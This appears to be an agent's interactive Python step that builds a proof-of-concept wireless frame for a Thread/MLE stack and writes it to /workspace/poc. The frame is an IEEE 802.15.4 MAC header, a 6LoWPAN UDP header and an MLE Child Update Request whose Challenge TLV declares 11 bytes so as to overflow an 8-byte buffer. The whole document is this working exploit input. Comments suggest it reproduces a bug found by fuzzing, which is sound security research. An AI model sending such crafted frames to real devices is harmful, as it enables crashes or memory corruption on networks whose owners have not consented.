Running Python code interactively: import struct

# Build the PoC frame

# MAC Header (15 bytes)
# FCF: Data frame, no security, PAN compression, dest=short, src=extended, version 2006
mac_fcf = bytes([0x41, 0xd8])
mac_seq = bytes([0xf8])
mac_dest_pan = bytes([0xad, 0xde])  # 0xdead
mac_dest_addr = bytes([0xff, 0xff])  # broadcast short address
mac_src_addr = bytes([0x5e, 0xf8, 0xf3, 0xbd, 0xfd, 0x52, 0xbf, 0x5a])  # extended address

mac_header = mac_fcf + mac_seq + mac_dest_pan + mac_dest_addr + mac_src_addr
print(f"MAC header: {len(mac_header)} bytes")

# 6LoWPAN IPHC + NHC UDP header (10 bytes)
# IPHC: TF=11(elided), NH=1(compressed), HLIM=11(255)
# SAM=11(elided from MAC), M=1, DAC=0, DAM=11(8-bit inline ff02::XX)
iphc = bytes([0x7f, 0x3b])
mcast_dest = bytes([0x02])  # ff02::0002

# NHC UDP: ports inline, checksum inline
nhc_udp = bytes([0xf0])
udp_src_port = bytes([0x4d, 0x4c])  # 19788
udp_dst_port = bytes([0x4d, 0x4c])  # 19788
udp_checksum = bytes([0xf2, 0xee])  # dummy checksum (not validated in fuzzer)

lowpan_header = iphc + mcast_dest + nhc_udp + udp_src_port + udp_dst_port + udp_checksum
print(f"6LoWPAN+UDP header: {len(lowpan_header)} bytes")

# MLE Header (11 bytes)
# SecuritySuite=0 (k154Security), SecurityControl=0x15, FrameCounter=0, KeySource=0, KeyIndex=1
mle_sec_suite = bytes([0x00])
mle_sec_control = bytes([0x15])  # kKeyIdMode2 | kSecEncMic32
mle_frame_counter = bytes([0x00, 0x00, 0x00, 0x00])
mle_key_source = bytes([0x00, 0x00, 0x00, 0x00])
mle_key_index = bytes([0x01])

mle_header = mle_sec_suite + mle_sec_control + mle_frame_counter + mle_key_source + mle_key_index
print(f"MLE header: {len(mle_header)} bytes")

# MLE Command: kCommandChildUpdateRequest = 13 = 0x0d
mle_command = bytes([0x0d])

# MLE TLVs
# Mode TLV: type=1, length=1, value=0x0f (RxOnWhenIdle set)
mode_tlv = bytes([0x01, 0x01, 0x0f])

# Challenge TLV: type=3, length=11 (0x0b), value=11 bytes
# The value is 11 bytes, but only 8 will be copied into ChallengeTlv.mChallenge
# The remaining 3 bytes trigger the overflow when GetLength() returns 11
challenge_tlv = bytes([0x03, 0x0b]) + b'\x41' * 11

mle_tlvs = mode_tlv + challenge_tlv
print(f"MLE TLVs: {len(mle_tlvs)} bytes")

# MLE Message Authentication Tag (4 bytes) - skipped in fuzzer build
mle_tag = bytes([0x00, 0x00, 0x00, 0x00])

# FCS (2 bytes) - not validated
fcs = bytes([0x00, 0x00])

# Assemble full frame
frame = mac_header + lowpan_header + mle_header + mle_command + mle_tlvs + mle_tag + fcs
print(f"Total frame: {len(frame)} bytes")
print(f"Hex: {frame.hex()}")

# Write to file
with open('/workspace/poc', 'wb') as f:
    f.write(frame)
print("Written to /workspace/poc")
